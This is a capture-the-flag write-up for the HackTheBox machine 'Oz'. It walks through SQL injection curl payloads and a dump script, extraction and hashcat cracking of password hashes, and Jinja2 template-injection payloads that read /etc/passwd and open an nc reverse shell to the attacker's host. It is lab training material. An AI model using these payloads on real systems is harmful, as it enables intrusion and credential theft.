---
title: HTB: Oz
url: https://0xdf.gitlab.io/2019/01/12/htb-oz.html
date: 2019-01-12T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: htb-oz, hackthebox, ctf, api, sqli, hashcat, ssti, jinja2, payloadsallthethings, docker, container, pivot, ssh, port-knocking, portainer, tplmap, jwt, htb-olympus
---

![oz-cover](https://0xdfimages.gitlab.io/img/oz-cover.png)

Oz was long. There was a bunch of enumeration at the front, but once you get going, it presented a relatively straight forward yet technically interesting path through two websites, a Server-Side Template Injection, using a database to access an SSH key, and then using the key to get access to the main host. To privesc, I’ll go back into a different container and take advatnage of a vulnarbility in the docker management software to get root access.

## Box Info

| Name | [Oz](https://hackthebox.com/machines/oz)  [Oz](https://hackthebox.com/machines/oz) [Play on HackTheBox](https://hackthebox.com/machines/oz) |
| --- | --- |
| Release Date | [01 Sep 2018](https://twitter.com/hackthebox_eu/status/1034830776347635712) |
| Retire Date | 01 Jan 2019 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Oz |
| Radar Graph | Radar chart for Oz |
| First Blood User | 15:11:21[shp4k shp4k](https://app.hackthebox.com/users/22245) |
| First Blood Root | 18:48:48[yuntao yuntao](https://app.hackthebox.com/users/12438) |
| Creators | [incidrthreat incidrthreat](https://app.hackthebox.com/users/442)  [Mumbai Mumbai](https://app.hackthebox.com/users/2686) |

## Recon

### nmap

`nmap` shows two ports open, both running HTTP via Python:

```

root@kali# nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.96
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-02 14:09 EDT
Nmap scan report for 10.10.10.96
Host is up (0.028s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
8080/tcp open  http-proxy

root@kali# nmap -sV -sC -p 80,8080 -oA nmap/scripts 10.10.10.96
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-02 14:13 EDT
Nmap scan report for 10.10.10.96
Host is up (0.019s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
|_http-title: OZ webapi
|_http-trane-info: Problem with XML parsing of /evox/about
8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-title: GBR Support - Login
|_Requested resource was http://10.10.10.96:8080/login
|_http-trane-info: Problem with XML parsing of /evox/about

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.63 seconds

```

### Website - port 80

#### Site

The site simply asks me to register, without any instruction as to how:

```

root@kali# curl 10.10.10.96

                <title>OZ webapi</title>
                <h3>Please register a username!</h3>

```

#### wfuzz

`gobuster` doesn’t work here because there’s a wildcare response:

```

root@kali# gobuster -u 10.10.10.96 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -x txt,php                                                                 

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.96/
[+] Threads      : 50
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : txt,php
[+] Timeout      : 10s
=====================================================
2018/11/02 14:15:53 Starting gobuster
=====================================================
2018/11/02 14:15:53 [-] Wildcard response found: http://10.10.10.96/9dd6e362-5a41-4bee-bc46-96ea98e83a2a => 200                                                                                                
2018/11/02 14:15:53 [!] To force processing of Wildcard responses, specify the '-fw' switch.
=====================================================
2018/11/02 14:15:53 Finished
=====================================================

```

I can show this on my own:

```

root@kali# curl 10.10.10.96/sadfsadfsadf
1YNSWFH1F9DQV939NSF10P6YCQEI8E7QG3KXTG9ZGOYB30YZTOZEFSU2PZPPYYDGVC9R772DBTGUGDV0ZP6RQ9RTGMYM4TZKIP32SA2BR2JO4M1K33G80UG9BHGAKCKKMNOANJIIA6OH2RXMS8KCBED9ITQ574YNBRQD0AHZM2
root@kali# curl 10.10.10.96/sadfsadfsadf
EH0IWUNK8AZ26R736IVZJWRXOODA5EEQBFAN5UBMSKB9E6JWYQZRQDSEXTRYA1DMLCCRIDHIYYFUDCD96T475VBQF7JIUL9U88UZ

```

So `wfuzz` to the rescue. I’ll start with this, and ctrl-c it immediately:

```

root@kali# wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -u http://10.10.10.96/FUZZ
********************************************************            
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.96/FUZZ
Total requests: 87664

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

000012:  C=200      3 L        6 W           75 Ch        "# on at least 3 different hosts"          
000013:  C=200      3 L        6 W           75 Ch        "#"
000014:  C=200      3 L        6 W           75 Ch        ""
000015:  C=200      0 L        1 W          243 Ch        "index"     
000016:  C=200      0 L        1 W          155 Ch        "images"
000017:  C=200      0 L        1 W           79 Ch        "download"
000018:  C=200      0 L        4 W           27 Ch        "2006"
000019:  C=200      0 L        4 W           27 Ch        "news"
000020:  C=200      0 L        1 W           86 Ch        "crack"
000021:  C=200      0 L        4 W           27 Ch        "serial"
000025:  C=200      0 L        4 W           27 Ch        "contact"^C
Finishing pending requests...

```

I’ll notice that everything seems to return either 4 words / 27 characters or 1 word with a random number of characters. I already saw the randomness above. I’ll check out one of the 4 word responses:

```

root@kali# curl 10.10.10.96/contact
Please register a username!

```

Ok, I’ll filter those both out, using `--hh 27` to hide responses with 27 characters and `--hw 1` to hide responses with one word. I get a much smaller list back:

```

root@kali# wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -u http://10.10.10.96/FUZZ --hh 27 --hw 1
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.96/FUZZ
Total requests: 87664

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

000202:  C=200      3 L        6 W           79 Ch        "users"

Total time: 384.4239
Processed Requests: 87664
Filtered Requests: 87648
Requests/sec.: 228.0399  

```

Unlike the others that just returned text, `/users` returns the html version:

```

root@kali# curl 10.10.10.96/users

                <title>OZ webapi</title>
                <h3>Please register a username!</h3>

```

I’m going to try to fuzz this out some more. Start `wfuzz` again without filters:

```

root@kali# wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -u http://10.10.10.96/users/FUZZ
********************************************************           
* Wfuzz 2.2.11 - The Web Fuzzer                        *        
********************************************************

Target: http://10.10.10.96/users/FUZZ
Total requests: 87664

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================                        

000015:  C=200      1 L        1 W            5 Ch        "index"        
000016:  C=200      1 L        1 W            5 Ch        "images"      
000017:  C=200      1 L        1 W            5 Ch        "download"    
000019:  C=200      1 L        1 W            5 Ch        "news"              
000018:  C=200      1 L        1 W            5 Ch        "2006"    
000020:  C=200      1 L        1 W            5 Ch        "crack"           
000027:  C=200      1 L        1 W            5 Ch        "search"               
000021:  C=200      1 L        1 W            5 Ch        "serial"
000022:  C=200      1 L        1 W            5 Ch        "warez"
000023:  C=200      1 L        1 W            5 Ch        "full"
000024:  C=200      1 L        1 W            5 Ch        "12"
000025:  C=200      1 L        1 W            5 Ch        "contact"
000026:  C=200      1 L        1 W            5 Ch        "about"
000028:  C=200      1 L        1 W            5 Ch        "spacer"
000029:  C=200      1 L        1 W            5 Ch        "privacy"
000030:  C=200      1 L        1 W            5 Ch        "11"

```

Time to get rid of 5 character responses:

```

root@kali# wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -u http://10.10.10.96/users/FUZZ --hh 5
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.96/users/FUZZ
Total requests: 87664

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

000259:  C=200      1 L        1 W           21 Ch        "admin"
002026:  C=500      4 L       40 W          291 Ch        "'"
006161:  C=200      1 L        1 W           21 Ch        "Admin"
021750:  C=200      0 L        1 W          104 Ch        "http%3A%2F%2Fwww"
029725:  C=500      4 L       40 W          291 Ch        "Oasis - 'Definitely Maybe'"
036860:  C=500      4 L       40 W          291 Ch        "Fran%c3%a7ais"
036861:  C=500      4 L       40 W          291 Ch        "Espa%c3%b1ol"
043601:  C=500      4 L       40 W          291 Ch        "Espa%C3%B1ol"
044486:  C=500      4 L       40 W          291 Ch        "%E9%A6%96%E9%A1%B5"
051347:  C=500      4 L       40 W          291 Ch        "Who's-Connecting"
071241:  C=500      4 L       40 W          291 Ch        "P%C3%A1gina_principal"
071064:  C=500      4 L       40 W          291 Ch        "%C0"
069680:  C=200      0 L        4 W           27 Ch        "http%3A%2F%2Fblog"
069552:  C=200      0 L        1 W          166 Ch        "http%3A%2F%2Fblogs"
069395:  C=200      0 L        4 W           27 Ch        "http%3A%2F%2Fyoutube"
068235:  C=500      4 L       40 W          291 Ch        "Fran%C3%A7ais"
082942:  C=200      0 L        4 W           27 Ch        "**http%3A%2F%2Fwww"

Total time: 741.9685
Processed Requests: 87664
Filtered Requests: 87632
Requests/sec.: 118.1505

```

There’s two interesting lines the the above results. First, admin seems like it’s worth checking out:

![1541189309410](https://0xdfimages.gitlab.io/img/1541189309410.png)

The other interesting result is `'` that returned a 500. That’s a crash, and it’s time to investigate for SQL injection.

### SQLI

#### POC

If I add a `'` to the end of my url, I do get a 500 error:

![1541189342899](https://0xdfimages.gitlab.io/img/1541189342899.png)

I’ll try a simple injection, and it works:

![1541189365505](https://0xdfimages.gitlab.io/img/1541189365505.png)

Next I’ll check to see if I can use `UNION` to get data. First, I need to figure out how many columns are being returned. Based on the json, it’s probably one, and I can confirm that:

```

root@kali# curl -s "http://10.10.10.96/users/'%20union%20select%201;--%20-"
{"username":"1"}

root@kali# curl -s "http://10.10.10.96/users/'%20union%20select%201,1;--%20-"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.</p>

```

It works when I do `' union select 1;-- -`, but not when i do `' union select 1,1;-- -`.

#### Enumeration

Now that I have union working, I’ll enumerate the database. First, the version (and using `jq` to isolate it, check out [my jq post](/2018/12/19/jq.html) if this is new to you):

```

root@kali# curl -s "http://10.10.10.96/users/'%20union%20select%20version();--%20-" | jq .username
"5.5.59-MariaDB-1~wheezy"

```

Now I’ll get the database user and the current database:

```

root@kali# curl -s "http://10.10.10.96/users/'%20union%20select%20user();--%20-" | jq -r '.username'
dorthi@10.100.10.6

root@kali# curl -s "http://10.10.10.96/users/'%20union%20select%20database();--%20-" | jq -r '.username'
ozdb

```

Next I’ll print the databases. But I run into a problem - it only returns one:

```

root@kali# curl -s "http://10.10.10.96/users/'%20union%20select%20schema_name%20FROM%20information_schema.schemata;--%20-" | jq -r '.username'
information_schema

```

I know there’s at least another named `ozdb`. In fact, I can get that using `limit` and `offset`:

```

root@kali# curl -s "http://10.10.10.96/users/'%20union%20select%20schema_name%20FROM%20information_schema.schemata%20limit%201%20offset%200;--%20-" | jq -r '.username'
information_schema
root@kali# curl -s "http://10.10.10.96/users/'%20union%20select%20schema_name%20FROM%20information_schema.schemata%20limit%201%20offset%201;--%20-" | jq -r '.username'
mysql
root@kali# curl -s "http://10.10.10.96/users/'%20union%20select%20schema_name%20FROM%20information_schema.schemata%20limit%201%20offset%202;--%20-" | jq -r '.username'
ozdb
root@kali# curl -s "http://10.10.10.96/users/'%20union%20select%20schema_name%20FROM%20information_schema.schemata%20limit%201%20offset%203;--%20-" | jq -r '.username'
performance_schema
root@kali# curl -s "http://10.10.10.96/users/'%20union%20select%20schema_name%20FROM%20information_schema.schemata%20limit%201%20offset%204;--%20-" | jq -r '.username'
null
root@kali# curl -s "http://10.10.10.96/users/'%20union%20select%20schema_name%20F

```

In case it’s not clear in the url encoding, it’s `' union select schema_name FROM information_schema.schemata limit 1 offset X;-- -`, where I change X each time. 0-3 return names, and 4 returns null. Now I have table names:

```

information_schema
mysql
ozdb
performance_schema

```

#### Script To Dump Tables / Columns

I want to next get the columns from each table, but that could be a lot, and it’s past time to make a short script. Since I have a curl commands that’s working well for me, I’ll just write a bash script that runs through the `information_schema.columns` table getting db name, table name, and column name. I’ll print the dbs and the tables to the screen, and record the column names. Some trial and error showed me that 333 was enough to loop over and get results:

```

  1 #!/bin/bash
  2 
  3 cur_db=''
  4 cur_table=''
  5 
  6 for i in $(seq 0 333); do
  7 
  8     result=$(curl -s "http://10.10.10.96/users/'%20union%20select%20concat(TABLE_SCHEMA,':',TABLE_NAME,':',COLUMN_NAME)%20from%20information_schema.columns%20where%20TABLE_SCHEMA%20!                                      =%20'Information_schema'%20LIMIT%201%20OFFSET%20${i};--%20-" | jq -r .username)
  9 
 10 
 11     db=$(echo $result | cut -d: -f1)
 12     table=$(echo $result | cut -d: -f2)
 13     col=$(echo $result | cut -d: -f3)
 14 
 15     if [ "${db}" != "${cur_db}" ]; then
 16         echo "${db}"
 17         cur_db=${db}
 18         cur_table=''
 19     fi
 20 
 21     if [ "${table}" != "${cur_table}" ]; then
 22         echo "    ${table}"
 23         cur_table=${table}
 24     fi
 25 
 26     echo "${result}" >> db_dump/${db}-${table}.columns
 27 
 28 done;

```

That runs to make:

```

root@kali# ./dump_oz_db.sh
mysql
    columns_priv
    db
    event
    func
    general_log
    help_category
    help_keyword
    help_relation
    help_topic
    host
    ndb_binlog_index
    plugin
    proc
    procs_priv
    proxies_priv
    servers
    slow_log
    tables_priv
    time_zone
    time_zone_leap_second
    time_zone_name
    time_zone_transition
    time_zone_transition_type
    user
ozdb
    tickets_gbw
    users_gbw
performance_schema
    cond_instances
    events_waits_current
    events_waits_history
    events_waits_history_long
    events_waits_summary_by_instance
    events_waits_summary_by_thread_by_event_name
    events_waits_summary_global_by_event_name
    file_instances
    file_summary_by_event_name
    file_summary_by_instance
    mutex_instances
    performance_timers
    rwlock_instances
    setup_consumers
    setup_instruments
    setup_timers
    threads

```

Since ozdb jumps out as most interesting, I’ll check out the columns for those tables:

```

root@kali# cat db_dump/ozdb-tickets_gbw.columns 
ozdb:tickets_gbw:id
ozdb:tickets_gbw:name
ozdb:tickets_gbw:desc
root@kali# cat db_dump/ozdb-users_gbw.columns 
ozdb:users_gbw:id
ozdb:users_gbw:username
ozdb:users_gbw:password

```

#### users Table

The users table looks particularly interesting, and I can write a bash loop to dump it out:

```

root@kali# for i in $(seq 0 10); do curl -s "http://10.10.10.96/users/'%20union%20select%20concat(id,':',username,':',password)%20from%20ozdb.users_gbw%20LIMIT%201%20OFFSET%20${i};--%20-" | jq -r .username; done
1:dorthi:$pbkdf2-sha256$5000$aA3h3LvXOseYk3IupVQKgQ$ogPU/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78
2:tin.man:$pbkdf2-sha256$5000$GgNACCFkDOE8B4AwZgzBuA$IXewCMHWhf7ktju5Sw.W.ZWMyHYAJ5mpvWialENXofk
3:wizard.oz:$pbkdf2-sha256$5000$BCDkXKuVMgaAEMJ4z5mzdg$GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY
4:coward.lyon:$pbkdf2-sha256$5000$bU2JsVYqpbT2PqcUQmjN.Q$hO7DfQLTL6Nq2MeKei39Jn0ddmqly3uBxO/tbBuw4DY
5:toto:$pbkdf2-sha256$5000$Zax17l1Lac25V6oVwnjPWQ$oTYQQVsuSz9kmFggpAWB0yrKsMdPjvfob9NfBq4Wtkg
6:admin:$pbkdf2-sha256$5000$d47xHsP4P6eUUgoh5BzjfA$jWgyYmxDK.slJYUTsv9V9xZ3WWwcl9EBOsz.bARwGBQ
null
null
null
null
null

```

#### Crack the Hashes

Those hashes are not immediately an obvious match on my [typical cheat sheet for hashes](https://hashcat.net/wiki/doku.php?id=example_hashes). They look kind of like Django (id 10000), but aren’t a perfect match. They also look kind of like PBKDF2-HMAC-SHA256 (id 10900).

In doing some reading about PBKDF2, I came across [this page](https://passlib.readthedocs.io/en/1.6.5/lib/passlib.hash.pbkdf2_digest.html) on the python implementation in passlib, and the output looked the same. I tried it for myself, and it is a match:

```

Python 3.6.6 (default, Jun 27 2018, 14:44:17) 
[GCC 8.1.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from passlib.hash import pbkdf2_sha256
>>> pbkdf2_sha256.encrypt("password", rounds=5000)
'$pbkdf2-sha256$5000$CcGYM0ZIqbXWGsM4x7hX6g$DbQp1makXRDjuCrOhiBB6B2UZb3p7YHnvN0h01bh43Q'

```

> This class implements a generic `PBKDF2-HMAC-SHA256`-based password hash, and follows the [Password Hash Interface](https://passlib.readthedocs.io/en/1.6.5/password_hash_api.html#password-hash-api).

Feeling confident I had the right hash, I converted the hashes into the format `hashcat` expects for this hash:

```

sha256:5000:aA3h3LvXOseYk3IupVQKgQ:ogPU/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78
sha256:5000:GgNACCFkDOE8B4AwZgzBuA:IXewCMHWhf7ktju5Sw.W.ZWMyHYAJ5mpvWialENXofk
sha256:5000:BCDkXKuVMgaAEMJ4z5mzdg:GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY
sha256:5000:bU2JsVYqpbT2PqcUQmjN.Q:hO7DfQLTL6Nq2MeKei39Jn0ddmqly3uBxO/tbBuw4DY
sha256:5000:Zax17l1Lac25V6oVwnjPWQ:oTYQQVsuSz9kmFggpAWB0yrKsMdPjvfob9NfBq4Wtkg
sha256:5000:d47xHsP4P6eUUgoh5BzjfA:jWgyYmxDK.slJYUTsv9V9xZ3WWwcl9EBOsz.bARwGBQ

```

And then ran `hashcat`. While pbkdf2 is notoriously slow to crack, this case proves that even they can be cracked with a known password, as I get the password for wizard.oz:

```

$ hashcat -m 10900 users.hashes /usr/share/wordlists/rockyou.txt -o users.cracked --force
...[snip]...
Session..........: hashcat
Status...........: Exhausted
Hash.Type........: PBKDF2-HMAC-SHA256
Hash.Target......: users.hashes
Time.Started.....: Fri Nov  2 19:22:22 2018 (7 hours, 0 mins)
Time.Estimated...: Sat Nov  3 02:22:27 2018 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:     2920 H/s (1.81ms)
Recovered........: 1/6 (16.67%) Digests, 1/6 (16.67%) Salts
Progress.........: 86066310/86066310 (100.00%)
Rejected.........: 0/86066310 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
HWMon.Dev.#1.....: N/A

$ cat users.cracked
sha256:5000:BCDkXKuVMgaAEMJ4z5mzdg:GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY:wizardofoz22

```

### Website - Port 8080

The root redirects to `/login`, which presents a login page for Golden Brick Road LLC’s support page:

![1541240214642](https://0xdfimages.gitlab.io/img/1541240214642.png)

The creds from the table (“wizard.oz” / “wizardofoz22”) work to get in, see 12 tickets. I won’t show it here, but these are the output of the other table in ozdb, tickets, that I dumped using SQLI:

![1541240371826](https://0xdfimages.gitlab.io/img/1541240371826.png)

Looking at the tickets, there’s a few hints here for things that will become interesting later:
- “Reissued new id\_rsa and id\_rsa.pub keys for ssh access to dorthi.”
- “Dorthi should be able to find her keys in the default folder under /home/dorthi/ on the db.”
- “Think of a better secret knock for the front door. Doesn’t seem that secure, a Lion got in today.”

I can view a pop up with the description of a ticket by clicking on the description button. I can also create new tickets by clicking on the plus. When I create a ticket, it’s not clear what happens on the server, but nothing changes or shows up in the list of tickets.

## SSTI –> RCE –> root Shell on tix-app

### Server Side Template Injection

Server Side Template Injection (SSTI) is a vulnerability in a template engine which uses variables and placeholders within HTML pages. Examples of these engines include Smarty, Mako, Twig, Jinja2, and [tons of others](https://en.wikipedia.org/wiki/Comparison_of_web_template_engines).

A dummy template might look like:

```

<html>
 <head><title>Hello {{ name }}</title></head>
 <body>
 Hello FOO
 </body>
</html>

```

Some kind of user input is passed to the engine, which then calls the template, fills in name, and returns html to the user.

If user input can make the template rendering engine do something unintended, that’s where the exploit comes in. Portswigger (the makers of burp) have a [nice page on SSTI](https://portswigger.net/blog/server-side-template-injection), as does [Netsparker](https://www.netsparker.com/blog/web-security/server-side-template-injection/). But my favorite go to for this kind of thing is [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injections). Also, since I originally solved Oz, I’ve learned about a tool for SSTI, `tplmap`. I’ll give that a shot in [Beyond Root](#jwt).

### HTTP for GBR Support

On submitting a new ticket, I never saw any change in the browser. But looking in `burp`, I see that the response does come back and display my input, but just in the form of a HTTP 302 redirect, so the browser never shows it:

```

POST / HTTP/1.1
Host: 10.10.10.96:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.96:8080/
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Connection: close
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU0MTM4MjY0NH0.lqjfl1X6PMzjZqW0XEPIfqGfmcxGuxuexotPVf28kX8
Upgrade-Insecure-Requests: 1

name=GBR-4045&desc=test

```

```

HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 25
Location: http://10.10.10.96:8080/
Server: Werkzeug/0.14.1 Python/2.7.14
Date: Mon, 05 Nov 2018 11:11:15 GMT

Name: GBR-4045 desc: test

```

This is useful, as now I’m not going to be doing this blind. I can also guess that the template is something really simple like:

```

Name: {{ name }} desc: {{ desc }}

```

### POC

The Portswigger and PayloadsAllTheThings sites have the same nice flow chart for testing for SSTI and getting the probable templating engine:

![1546642016484](https://0xdfimages.gitlab.io/img/1546642016484.png)

I’ll grab my cookie, and move over to curl to test:

```

root@kali# curl -X POST --data "name=asd&desc={7*7}" http://10.10.10.96:8080/ -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU0NjY0Mzg5NX0.4_KeOJDJPbguN1bLZg8dbOmSr5f5L5IlpS6XixNsLSU"
Name: asd desc: {7*7}

root@kali# curl -X POST --data "name=asd&desc={{7*7}}" http://10.10.10.96:8080/ -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU0NjY0Mzg5NX0.4_KeOJDJPbguN1bLZg8dbOmSr5f5L5IlpS6XixNsLSU"
Name: asd desc: 49

root@kali# curl -X POST --data "name=asd&desc={{7*'7'}}" http://10.10.10.96:8080/ -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU0NjY0Mzg5NX0.4_KeOJDJPbguN1bLZg8dbOmSr5f5L5IlpS6XixNsLSU"
Name: asd desc: 7777777

```

Based on that testing, it’s working, and it’s likely Jinja2 (Twig would have returned 49 for the last test).

### Read File

Looking at the [Jinja2 section on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injections#jinja2), I’ll try to read a file:

```

root@kali# curl -X POST http://10.10.10.96:8080/ -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU0NjY1MTA1Mn0.YuW5qoU_-327dbMSnydFQ6q5wyFPw3PFlDHDOjuu2Mk" --data "name=name&desc={{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}"
Name: name desc: root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
nut:x:84:84:nut:/var/state/nut:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin

```

### Code Execution

Now I’ll use the code execution payload. First, I’ll see if I can get a simple `id` to run:

```

root@kali# curl -X POST http://10.10.10.96:8080/ -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU0NjY1MTA1Mn0.YuW5qoU_-327dbMSnydFQ6q5wyFPw3PFlDHDOjuu2Mk" --data "name=name&desc={{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} {{ config.from_pyfile('/tmp/evilconfig.cfg') }} {{ config['RUNCMD']('id',shell=True) }}"
Name: name desc: None True uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

```

Next, I’ll just ping myself:

```

name=GBR-4045&desc={{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} {{ config.from_pyfile('/tmp/evilconfig.cfg') }} {{ config['RUNCMD']('ping -c 1 10.10.14.15',shell=True) }}

```

```

root@kali# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
20:32:26.216742 IP 10.10.10.96 > kali: ICMP echo request, id 40448, seq 0, length 64
20:32:26.216765 IP kali > 10.10.10.96: ICMP echo reply, id 40448, seq 0, length 64

```

Now I’ll go for the full shell:

```

name=GBR-4045&desc={{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} {{ config.from_pyfile('/tmp/evilconfig.cfg') }} {{ config['RUNCMD']('rm /tmp/d; mkfifo /tmp/d; cat /tmp/d | /bin/sh -i 2>%261 | nc 10.10.14.15 443 > /tmp/d',shell=True) }}

```

```

root@kali# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.96] 46860
/bin/sh: can't access tty; job control turned off
/app # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/app # hostname
tix-app

```

I’ve got a root shell on tix-app!

## Enumeration From tix-app

### Host Enumeration

Well, a root shell is typically a good thing, but in HTB, when it’s your initial shell, it likely means you’re in a container, and you’ll need to pivot to another host.

There’s no user.txt or root.txt on the host:

```

/app # find / -name user.txt
/app # find / -name root.txt
/app # 

```

I discovered when trying to upgrade my shell using `python -c 'import pty;pty.spawn("/bin/bash")'` that `bash` isn’t even on the host.

The IP address of this host is 10.100.10.2:

```

/app/ticketer # ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
13: eth0@if14: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:0a:64:0a:02 brd ff:ff:ff:ff:ff:ff
    inet 10.100.10.2/29 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:aff:fe64:a02/64 scope link 
       valid_lft forever preferred_lft forever

```

I’ll also find a Docker file in the `/app` directory:

```

/app # cat Dockerfile 
FROM python:2.7-alpine

MAINTAINER incidrthreat & mumbai

RUN mkdir /app

COPY ./ /app/

RUN pip install flask flask-sqlalchemy pyjwt passlib pymysql\
    && apk --no-cache add --virtual build-dependencies libc-dev libffi-dev py-mysqldb \
    && apk add --no-cache mariadb-client-libs mysql-client

WORKDIR /app

EXPOSE 8080

